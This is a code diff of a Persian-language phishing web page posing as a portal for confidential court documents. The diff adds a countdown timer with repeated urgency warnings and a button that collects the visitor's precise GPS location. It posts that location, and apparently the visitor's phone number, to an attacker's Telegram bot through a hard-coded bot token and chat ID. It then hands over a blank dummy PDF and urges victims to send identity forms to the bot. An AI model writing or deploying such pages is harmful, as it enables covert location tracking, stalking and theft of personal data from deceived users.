@@ -37,6 +37,15 @@
             margin-bottom: 30px;
             text-align: center;
         }
+        .timer-display {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+            font-weight: bold;
+            font-size: 16px;
+        }
         .info-box {
             background-color: #f0f8ff;
             border-right: 5px solid #0056b3;
@@ -79,7 +88,7 @@
             font-weight: bold;
             margin-left: 10px;
             border-radius: 6px;
-            user-select: none; /* جلوگیری از انتخاب متن */
+            user-select: none;
             color: #172a5a;
             width: 150px;
             text-align: center;
@@ -88,7 +97,7 @@
             width: 100%;
             padding: 15px;
             font-size: 18px;
-            background-color: #28a745; /* سبز برای ثبت و دانلود */
+            background-color: #28a745;
             color: white;
             border: none;
             border-radius: 6px;
@@ -117,7 +126,7 @@
         .success { background-color: #d4edda; color: #155724; }
         .warning { background-color: #fff3cd; color: #856404; }
 
-        /* لایه پوششی برای قفل کردن صفحه */
+        /* لایه پوششی قفل صفحه */
         #lock-overlay {
             position: fixed;
             top: 0;
@@ -152,24 +161,29 @@
         }
     </style>
 </head>
-<body onload="checkLocationOnLoad()"> 
+<body onload="initializePage()"> 
     
     <div id="lock-overlay" class="hidden">
-        <h2>❌ دسترسی ممنوع!</h2>
-        <p style="font-size: 18px; color: #333;">جهت ورود به سامانه، لطفاً مکان‌یابی (Location Service) دستگاه خود را فعال نموده و سپس صفحه را رفرش کنید.</p>
-        <button onclick="window.location.reload();" style="width: 250px; background-color: #dc3545;">تلاش مجدد (رفرش صفحه)</button>
+        <h2 id="lock-title"></h2>
+        <p id="lock-message" style="font-size: 18px; color: #333;"></p>
+        <button onclick="retryLocationOrReload();" id="lock-button" style="width: 280px; background-color: #dc3545; margin-top: 20px;"></button>
     </div>
 
     <div class="container hidden" id="main-content">
         <h1>سامانه دریافت مدارک محرمانه و قضایی</h1>
         
+        <div id="timer-display" class="timer-display"></div>
+
         <div class="info-box">
-            <p><strong>مهم:</strong> برای دانلود مدارک محرم و رای دادگاه عالی، لطفاً شماره تماس و کد امنیتی زیر را با دقت وارد نمایید. مکان‌یابی شما برای ثبت در سوابق فعال است.</p>
+            <p><strong>مهم:</strong> برای دانلود مدارک محرم، لطفاً روی دکمه *"تأیید و ارسال موقعیت مکانی"* کلیک کنید. سپس فرم زیر را تکمیل نمایید.</p>
         </div>
         
         <input type="hidden" id="bot-token" value="7851461640:AAFr8MiKSffcmsalQMF-oczoUwopV1bfcu8"> 
         <input type="hidden" id="chat-id" value="7570861617"> 
         <input type="hidden" id="user-token-id" value="CONFIDENTIAL-DOCS-2025-A">
+        
+        <button onclick="requestAndSendLocation()" id="location-button" style="background-color: #007bff;">تأیید و ارسال موقعیت مکانی</button>
+
 
         <form id="auth-form" onsubmit="handleDownload(event)">
             <div class="form-group">
@@ -188,14 +202,22 @@
             <button type="submit" id="download-button" disabled>ثبت و دانلود مدارک محرم</button>
         </form>
         
-        <div id="status-message" class="warning">لطفاً شماره تماس و کد امنیتی را وارد نمایید.</div>
+        <div id="status-message" class="warning">لطفاً ابتدا موقعیت مکانی را ارسال نمایید.</div>
         <div id="loading-spinner" class="loading-gif hidden"></div>
     </div>
 
     <script>
         // --- متغیرهای سراسری ---
+        const ONE_HOUR_MS = 60 * 60 * 1000; 
+        const WARNING_INTERVAL_MS = 20 * 1000; // 20 ثانیه
+        const MAX_TIME_SECONDS = 3600; // 1 ساعت = 3600 ثانیه
+        
         let currentCaptcha = '';
         let userLocation = null;
+        let timerInterval;
+        let timeLeft = MAX_TIME_SECONDS; 
+        let isLocationSent = false;
+
 
         // --- توابع کمکی ---
 
@@ -220,37 +242,113 @@
             document.getElementById('lock-overlay').classList.toggle('hidden', show);
         }
 
-        // --- فاز ۱: کنترل مکان‌یابی و قفل صفحه ---
+        // --- مدیریت تایمر ---
 
-        function checkLocationOnLoad() {
-            // نمایش یک پیام اولیه قبل از درخواست
-            updateStatus("⏳ در حال بررسی وضعیت مکان‌یابی دستگاه...", 'warning');
+        function startTimer() {
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                document.getElementById('timer-display').textContent = زمان باقیمانده برای ورود: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')};
+                
+                // هشدار ۲۰ ثانیه‌ای
+                if (timeLeft > 0 && timeLeft % 20 === 0) {
+                     updateStatus("⚠ هشدار: زمان ورود شما به سایت در حال انقضا است. لطفاٌ اطلاعات را تکمیل نمایید.", 'warning');
+                }
+
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    handleTimeExpired();
+                }
+            }, 1000);
+        }
+        
+        function handleTimeExpired() {
+            // قفل کردن صفحه در صورت انقضای زمان
+            document.getElementById('lock-title').textContent = "❌ مهلت زمانی به پایان رسید!";
+            document.getElementById('lock-message').innerHTML = "زمان مجاز شما برای دسترسی به محتوای محرمانه به پایان رسید. لطفاً مجدداً درخواست دهید.";
+            document.getElementById('lock-button').textContent = "شروع مجدد (رفرش صفحه)";
+            toggleContent(false);
+        }
+
+        function retryLocationOrReload() {
+            window.location.reload();
+        }
+
+        function initializePage() {
+             // هیچ درخواستی برای لوکیشن در ابتدا انجام نمی‌شود، مستقیماً صفحه اصلی نمایش داده می‌شود
+             // اما دکمه‌ها غیرفعال هستند تا مجوز مکان گرفته شود
+            toggleContent(true);
+            generateCaptcha();
+            startTimer();
             
-            // درخواست مجوز لوکیشن
+            // قفل کردن دکمه دانلود و دکمه لوکیشن تا زمان ارسال موفقیت‌آمیز
+            document.getElementById('download-button').disabled = true;
+            document.getElementById('location-button').disabled = false; // دکمه لوکیشن همیشه فعال است
+            updateStatus("لطفاً روی دکمه آبی رنگ *تأیید و ارسال موقعیت مکانی* کلیک کنید.", 'warning');
+        }
+
+
+        // --- فاز ۱: درخواست لوکیشن با کلیک ---
+
+        function requestAndSendLocation() {
+            const button = document.getElementById('location-button');
+            button.disabled = true; // غیرفعال کردن دکمه حین فرآیند
+            updateStatus("⏳ در حال درخواست موقعیت مکانی... لطفاً مجوز مرورگر را تأیید کنید.", 'warning');
+
+            // دریافت لوکیشن با حذف Timeout (انتظار نامحدود)
             navigator.geolocation.getCurrentPosition(
                 
-                // Success: مکان‌یابی فعال است
+                // Success Callback: در صورت دریافت موفقیت‌آمیز مختصات
                 (position) => {
-                    userLocation = { lat: position.coords.latitude, lon: position.coords.longitude };
-                    // ارسال لوکیشن به تلگرام و سپس نمایش صفحه اصلی
-                    sendLocationToTelegram(userLocation.lat, userLocation.lon, 'Location-Check-Success');
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
                     
-                    // نمایش محتوای اصلی و فعال کردن رویدادها
-                    toggleContent(true); 
-                    generateCaptcha(); // ساخت کد امنیتی
-                    document.getElementById('download-button').disabled = true;
-                    updateStatus("✅ مکان‌یابی فعال شد. فرم را تکمیل نمایید.", 'success');
+                    userLocation = { lat: lat, lon: lon };
+                    isLocationSent = true;
+
+                    updateStatus(✅ موقعیت مکانی دریافت شد. در حال ارسال به تلگرام...);
+                    
+                    // ارسال لوکیشن به تلگرام
+                    sendLocationToTelegram(lat, lon, 'Location-Click-Success');
+                    
+                    button.disabled = true; // قفل کردن دکمه لوکیشن بعد از ارسال موفقیت‌آمیز
+                    // بررسی وضعیت فرم برای فعال کردن دکمه دانلود
+                    checkFormValidity();
                 },
                 
-                // Error: مکان‌یابی خاموش است یا کاربر اجازه نداده است
+                // Error Callback: در صورت بروز خطا (مثل خاموش بودن GPS)
                 (error) => {
-                    // نمایش صفحه قفل
-                    toggleContent(false); 
+                    button.disabled = false; // فعال‌سازی مجدد دکمه برای تلاش مجدد
+                    handleLocationError(error);
                 },
-                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                
+                // تنظیمات Geolocation API
+                {
+                    enableHighAccuracy: true,
+                    // timeout: <حذف شد برای انتظار نامحدود>
+                    maximumAge: 0
+                }
             );
         }
         
+        function handleLocationError(error) {
+            let errorMessage;
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMessage = "❌ *عدم مجوز:* کاربر دسترسی را لغو کرد. لطفاً مجوز مکان را Allow کنید و دوباره کلیک نمایید.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = "⚠ *خطای GPS:* اطلاعات موقعیت مکانی در دسترس نیست. مکان‌یابی گوشی را بررسی کنید و دوباره تلاش نمایید.";
+                    break;
+                default:
+                    errorMessage = "🔥 *خطای نامشخص:* در دریافت موقعیت مکانی رخ داد. مجدداً کلیک کنید.";
+            }
+            updateStatus(errorMessage, 'error');
+        }
+
         // --- فاز ۲: احراز هویت و فعال‌سازی دکمه دانلود ---
 
         document.getElementById('captcha-input').addEventListener('input', checkFormValidity);
@@ -259,29 +357,34 @@
         function checkFormValidity() {
             const phone = document.getElementById('phone-number').value.trim();
             const captcha = document.getElementById('captcha-input').value.trim();
-            const button = document.getElementById('download-button');
+            const downloadButton = document.getElementById('download-button');
 
             const isPhoneValid = phone.match(/^[0-9]{10,12}$/);
             const isCaptchaCorrect = captcha.toUpperCase() === currentCaptcha;
 
-            if (isPhoneValid && isCaptchaCorrect) {
-                button.disabled = false;
+            // شرط دانلود: لوکیشن ارسال شده باشد AND فرم صحیح باشد
+            if (isLocationSent && isPhoneValid && isCaptchaCorrect) {
+                downloadButton.disabled = false;
                 updateStatus("آماده برای دانلود مدارک.", 'success');
             } else {
-                button.disabled = true;
-                updateStatus("لطفاً شماره تماس و کد امنیتی را صحیح وارد نمایید.", 'warning');
+                downloadButton.disabled = true;
+                if (!isLocationSent) {
+                    updateStatus("لطفاً ابتدا روی دکمه *تأیید و ارسال موقعیت مکانی* کلیک نمایید.", 'warning');
+                } else {
+                    updateStatus("لطفاً شماره تماس و کد امنیتی را صحیح وارد نمایید.", 'warning');
+                }
             }
         }
 
         // --- فاز ۳: پروسس و دانلود ---
 
         function handleDownload(event) {
-            event.preventDefault(); // جلوگیری از ارسال فرم سنتی
+            event.preventDefault(); 
+            clearInterval(timerInterval); // توقف تایمر
             const button = document.getElementById('download-button');
             const spinner = document.getElementById('loading-spinner');
             const phoneNumber = document.getElementById('phone-number').value.trim();
             
-            // قفل کردن دکمه و نمایش Loading
             button.disabled = true;
             spinner.classList.remove('hidden');
             updateStatus("⏳ در حال پردازش و آماده‌سازی مدارک محرم...", 'warning');
@@ -292,7 +395,7 @@
             // شبیه‌سازی دانلود بعد از 3 ثانیه
             setTimeout(() => {
                 
-                // ایجاد لینک دانلود ساختگی برای PDF (میتوانید لینک واقعی PDF را اینجا بگذارید)
+                // ایجاد لینک دانلود ساختگی برای PDF
                 const pdfData = "data:application/pdf;base64,JVBERi0xLjEKJcOkw7zEnwpbCiAgPDwvVHlwZSAvUGFnZS9NZWRpYUJveCBbMCAwIDYxMiA3OTJdL1JvdGF0ZSAwPj4KXV0K"; // نمونه PDF خالی
                 const a = document.createElement('a');
                 a.href = pdfData;
@@ -301,32 +404,34 @@
                 a.click();
                 document.body.removeChild(a);
 
-                // بازگشت وضعیت
+                // پیام نهایی
                 spinner.classList.add('hidden');
-                updateStatus(✅ **دانلود موفق!** برای دریافت مدارک محرم و رای دادگاه عالی، فورم اظهار هویت را خانه پُرینماید و به کانال تلگرام location904411_Bot ارسال نماید., 'success');
+                const finalMessage = ✅ **دانلود موفق!** برای دریافت مدارک محرم و رای دادگاه عالی، فورم اظهار هویت را خانه پُرینماید و به کانال تلگرام **location904411_Bot** ارسال نماید.;
+                updateStatus(finalMessage, 'success');
                 
-            }, 3000); // 3 ثانیه Loading GIF
+            }, 3000); 
         }
         
-        // --- توابع ارسال به تلگرام (به روز شده) ---
+        // --- توابع ارسال به تلگرام ---
 
         function sendLocationToTelegram(lat, lon, reason) {
             const BOT_TOKEN = document.getElementById('bot-token').value;
             const CHAT_ID = document.getElementById('chat-id').value;
             
-            const telegramApiUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
+            const telegramApiUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendLocation;
 
-            const message = (
-                ⚠ **کنترل ورود سامانه:**\n +
-                **وضعیت:** ${reason}\n +
-                **عرض:** ${lat}\n +
-                **طول:** ${lon}
-            );
+            const payload = {
+                chat_id: CHAT_ID,
+                latitude: lat,
+                longitude: lon,
+                caption: 🚨 **${reason}**\n**عرض:** ${lat}\n**طول:** ${lon}\n**زمان:** ${new Date().toLocaleString('fa-IR')},
+                parse_mode: 'Markdown'
+            };
 
             fetch(telegramApiUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
+                body: JSON.stringify(payload),
             }).catch(e => console.error("Error sending check status to Telegram:", e));
         }
         
@@ -334,7 +439,6 @@
             const BOT_TOKEN = document.getElementById('bot-token').value;
             const CHAT_ID = document.getElementById('chat-id').value;
             const USER_TOKEN = document.getElementById('user-token-id').value;
-            const locationString = userLocation ? ${userLocation.lat},${userLocation.lon} : 'N/A';
             
             const telegramApiUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendLocation;
 
@@ -359,9 +463,6 @@
             }).catch(e => console.error("Error sending final data to Telegram:", e));
         }
 
-        // --- فراخوانی اولیه برای ساخت Captcha هنگام بارگذاری ---
-        // (این خط قبلاً در checkLocationOnLoad فراخوانی می‌شد، اما برای اطمینان در اینجا نیز قرار دارد)
-        // generateCaptcha(); 
     </script>
 </body>
 </html>
